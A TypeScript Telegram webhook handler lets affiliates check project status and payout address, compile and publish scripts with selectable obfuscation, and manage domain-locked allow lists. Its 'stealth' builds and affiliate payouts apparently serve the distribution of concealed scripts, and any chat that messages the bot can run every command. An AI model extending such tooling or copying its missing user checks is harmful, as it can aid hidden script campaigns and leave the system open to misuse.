/**
 * Per-affiliate Telegram bot handler.
 *
 * Each affiliate registers their own Telegram bot. We expose one webhook URL per
 * bot token: POST /api/telegram/affiliate/[token]
 *
 * Because the token is embedded in the URL, the project identity is implicit —
 * no `/login` step is needed. We verify the token matches a stored project, then
 * allow the affiliate to manage their own project via Telegram.
 *
 * Commands:
 *   /start  /help
 *   /status
 *   /compile [none|minify|medium|heavy]
 *   /domains
 *   /add-domain <domain>
 *   /remove-domain <domain>
 */

import { compileAffiliateProject } from "@/lib/affiliate-compile";
import {
  getAffiliateConfigCurrentVersion,
  getAffiliateProject,
  updateAffiliateProject,
} from "@/lib/projects";
import { listScriptBuilds } from "@/lib/script-build-store";
import type { ObfuscationLevel } from "@/lib/obfuscator";
import { decrypt, isEncrypted } from "@/lib/encryption";
import { getRedis } from "@/lib/redis";

// ── Telegram types ────────────────────────────────────────

type TelegramMessage = {
  message_id: number;
  text?: string;
  chat: { id: number; type: string };
  from?: { id: number; first_name?: string; username?: string };
};

type TelegramCallbackQuery = {
  id: string;
  data?: string;
  from: { id: number; first_name?: string; username?: string };
  message?: TelegramMessage;
};

export type TelegramUpdate = {
  update_id: number;
  message?: TelegramMessage;
  callback_query?: TelegramCallbackQuery;
};

type InlineKeyboardButton = { text: string; callback_data?: string; url?: string };
type InlineKeyboardMarkup = { inline_keyboard: InlineKeyboardButton[][] };

// ── Helpers ───────────────────────────────────────────────

const OBFUSCATION_LEVELS: ObfuscationLevel[] = ["none", "minify", "medium", "heavy"];

function escapeHtml(value: string) {
  return value.replaceAll("&", "&amp;").replaceAll("<", "&lt;").replaceAll(">", "&gt;");
}

function normalizeDomain(value: string) {
  return value.trim().toLowerCase().replace(/^https?:\/\//, "").replace(/\/.*$/, "");
}

function isValidDomain(value: string) {
  return /^[a-z0-9.-]+\.[a-z]{2,}$/i.test(value);
}

function parseObfuscationLevel(value?: string): ObfuscationLevel {
  return OBFUSCATION_LEVELS.includes(value as ObfuscationLevel) ? (value as ObfuscationLevel) : "medium";
}

function affiliateKeyboard(projectId: string): InlineKeyboardMarkup {
  return {
    inline_keyboard: [
      [
        { text: "Status", callback_data: `aff:status:${projectId}` },
        { text: "Compile", callback_data: `aff:compile:${projectId}:medium` },
      ],
      [
        { text: "Domains", callback_data: `aff:domains:${projectId}` },
      ],
    ],
  };
}

// ── Telegram API calls (using the affiliate's own bot token) ──────────────

async function affiliateTelegramRequest(botToken: string, method: string, payload: Record<string, unknown>) {
  const response = await fetch(`https://api.telegram.org/bot${botToken}/${method}`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(payload),
  });
  // Non-throwing: affiliate bots may be misconfigured
  const data = (await response.json().catch(() => null)) as { ok?: boolean; description?: string } | null;
  if (!response.ok || !data?.ok) {
    console.warn(`[affiliate-bot] ${method} failed:`, data?.description);
  }
}

async function sendMessage(
  botToken: string,
  chatId: string,
  text: string,
  replyMarkup?: InlineKeyboardMarkup,
) {
  await affiliateTelegramRequest(botToken, "sendMessage", {
    chat_id: chatId,
    text,
    parse_mode: "HTML",
    reply_markup: replyMarkup,
    disable_web_page_preview: true,
  });
}

async function answerCallbackQuery(botToken: string, callbackQueryId: string, text?: string) {
  await affiliateTelegramRequest(botToken, "answerCallbackQuery", {
    callback_query_id: callbackQueryId,
    text,
    show_alert: false,
  });
}

// ── Project resolution by bot token ───────────────────────

/**
 * Looks up the affiliate project whose stored telegramBotToken matches the
 * provided raw token. We scan the list; in practice the list is small.
 */
export async function resolveProjectByBotToken(rawToken: string): Promise<string | null> {
  const redis = await getRedis();
  const raw = await redis.get("affiliates:list");
  if (!raw) return null;

  const ids: string[] = JSON.parse(raw);
  for (const id of ids) {
    const projectRaw = await redis.get(`affiliate:${id}`);
    if (!projectRaw) continue;
    const project = JSON.parse(projectRaw) as { telegramBotToken?: string };
    if (!project.telegramBotToken) continue;

    const stored = isEncrypted(project.telegramBotToken)
      ? (() => { try { return decrypt(project.telegramBotToken!); } catch { return null; } })()
      : project.telegramBotToken;

    if (stored === rawToken) return id;
  }
  return null;
}

// ── Command handlers ──────────────────────────────────────

async function sendHelp(botToken: string, chatId: string) {
  await sendMessage(
    botToken,
    chatId,
    [
      "<b>Affiliate Bot Commands</b>",
      "",
      "/start — welcome",
      "/help — this message",
      "/status — project status",
      "/compile [none|minify|medium|heavy] — rebuild script",
      "/domains — list allowed domains",
      "/add-domain &lt;domain&gt; — add domain",
      "/remove-domain &lt;domain&gt; — remove domain",
    ].join("\n"),
  );
}

async function sendProjectStatus(botToken: string, chatId: string, projectId: string) {
  const project = await getAffiliateProject(projectId);
  if (!project) {
    await sendMessage(botToken, chatId, "Project not found.");
    return;
  }

  const configVersion = await getAffiliateConfigCurrentVersion(projectId);
  const builds = await listScriptBuilds();
  const latestBuild = builds.find((b) => b.filename.includes("stealthv26-")) ?? null;

  await sendMessage(
    botToken,
    chatId,
    [
      `<b>${escapeHtml(project.name)}</b>`,
      `id: <code>${project.id}</code>`,
      `status: <b>${project.status}</b>`,
      `payout: <code>${project.payoutAddress}</code>`,
      `domains: <b>${project.domains.length}</b>`,
      `configVersion: <b>${configVersion}</b>`,
      `lastCompiled: <code>${project.lastCompiled || "never"}</code>`,
      latestBuild
        ? `latestPublished: <code>${latestBuild.createdAt}</code>`
        : "latestPublished: <code>none</code>",
    ].join("\n"),
    affiliateKeyboard(projectId),
  );
}

async function handleCompile(botToken: string, chatId: string, projectId: string, level: ObfuscationLevel) {
  await sendMessage(
    botToken,
    chatId,
    `Compile started with <b>${level}</b> obfuscation…`,
  );

  try {
    const result = await compileAffiliateProject({
      projectId,
      obfuscationLevel: level,
      publishBuild: true,
    });

    await sendMessage(
      botToken,
      chatId,
      [
        "<b>Compile complete</b>",
        `configVersion: <b>${result.configVersion}</b>`,
        `domainLock: <b>${result.domainLockEnabled ? "enabled" : "disabled"}</b>`,
        `size: <b>${(result.bundle.length / 1024).toFixed(2)} KB</b>`,
        result.publishedBuild
          ? `url: <code>${result.publishedBuild.url}</code>`
          : "published: not saved",
      ].join("\n"),
      result.publishedBuild
        ? {
            inline_keyboard: [[
              {
                text: "Open Script",
                url: `${process.env.NEXT_PUBLIC_BASE_URL || "http://localhost:3000"}${result.publishedBuild.url}`,
              },
            ]],
          }
        : undefined,
    );
  } catch (err) {
    await sendMessage(botToken, chatId, `Compile failed: ${String(err)}`);
  }
}

async function handleDomains(botToken: string, chatId: string, projectId: string) {
  const project = await getAffiliateProject(projectId);
  if (!project) {
    await sendMessage(botToken, chatId, "Project not found.");
    return;
  }
  await sendMessage(
    botToken,
    chatId,
    project.domains.length
      ? `<b>Allowed domains</b>\n${project.domains.map((d) => `• <code>${d}</code>`).join("\n")}`
      : "No domains configured.",
  );
}

async function handleDomainMutation(
  botToken: string,
  chatId: string,
  projectId: string,
  rawDomain: string,
  action: "add" | "remove",
) {
  const project = await getAffiliateProject(projectId);
  if (!project) {
    await sendMessage(botToken, chatId, "Project not found.");
    return;
  }

  const domain = normalizeDomain(rawDomain);
  if (!isValidDomain(domain)) {
    await sendMessage(botToken, chatId, "Invalid domain format.");
    return;
  }

  const nextDomains =
    action === "add"
      ? [...new Set([...project.domains, domain])]
      : project.domains.filter((d) => d !== domain);

  await updateAffiliateProject(projectId, { domains: nextDomains });
  await sendMessage(
    botToken,
    chatId,
    `${action === "add" ? "Added" : "Removed"} <code>${domain}</code>. Total: <b>${nextDomains.length}</b>`,
  );
}

// ── Update processor ──────────────────────────────────────

async function handleCommand(
  botToken: string,
  chatId: string,
  projectId: string,
  text: string,
) {
  const [command, ...args] = text.trim().split(/\s+/);

  switch (command.toLowerCase()) {
    case "/start":
      await sendMessage(botToken, chatId, "Affiliate bot ready. Use /help for commands.");
      await sendHelp(botToken, chatId);
      return;
    case "/help":
      await sendHelp(botToken, chatId);
      return;
    case "/status":
      await sendProjectStatus(botToken, chatId, projectId);
      return;
    case "/compile":
      await handleCompile(botToken, chatId, projectId, parseObfuscationLevel(args[0]));
      return;
    case "/domains":
      await handleDomains(botToken, chatId, projectId);
      return;
    case "/add-domain":
      if (!args[0]) {
        await sendMessage(botToken, chatId, "Usage: /add-domain <domain>");
        return;
      }
      await handleDomainMutation(botToken, chatId, projectId, args[0], "add");
      return;
    case "/remove-domain":
      if (!args[0]) {
        await sendMessage(botToken, chatId, "Usage: /remove-domain <domain>");
        return;
      }
      await handleDomainMutation(botToken, chatId, projectId, args[0], "remove");
      return;
    default:
      await sendMessage(botToken, chatId, "Unknown command. Use /help.");
  }
}

async function handleCallback(
  botToken: string,
  projectId: string,
  query: TelegramCallbackQuery,
) {
  const chatId = String(query.message?.chat.id || query.from.id);
  const data = query.data || "";
  // Format: aff:<action>:<projectId>[:<value>]
  const parts = data.split(":");
  const action = parts[1];
  const value = parts[3];

  switch (action) {
    case "status":
      await sendProjectStatus(botToken, chatId, projectId);
      await answerCallbackQuery(botToken, query.id, "Status refreshed");
      return;
    case "compile":
      await answerCallbackQuery(botToken, query.id, "Compile started");
      await handleCompile(botToken, chatId, projectId, parseObfuscationLevel(value));
      return;
    case "domains":
      await handleDomains(botToken, chatId, projectId);
      await answerCallbackQuery(botToken, query.id);
      return;
    default:
      await answerCallbackQuery(botToken, query.id, "Unsupported action");
  }
}

/**
 * Main entry point called from the webhook route.
 *
 * @param rawToken  The bot token extracted from the URL path (not validated yet)
 * @param update    The Telegram update payload
 * @returns true if processed, false if the token does not match any project
 */
export async function processAffiliateUpdate(
  rawToken: string,
  update: TelegramUpdate,
): Promise<boolean> {
  const projectId = await resolveProjectByBotToken(rawToken);
  if (!projectId) return false;

  // We know the token is valid — use it directly
  const botToken = rawToken;

  if (update.message?.text) {
    const chatId = String(update.message.chat.id);
    await handleCommand(botToken, chatId, projectId, update.message.text);
    return true;
  }

  if (update.callback_query) {
    await handleCallback(botToken, projectId, update.callback_query);
    return true;
  }

  return true;
}
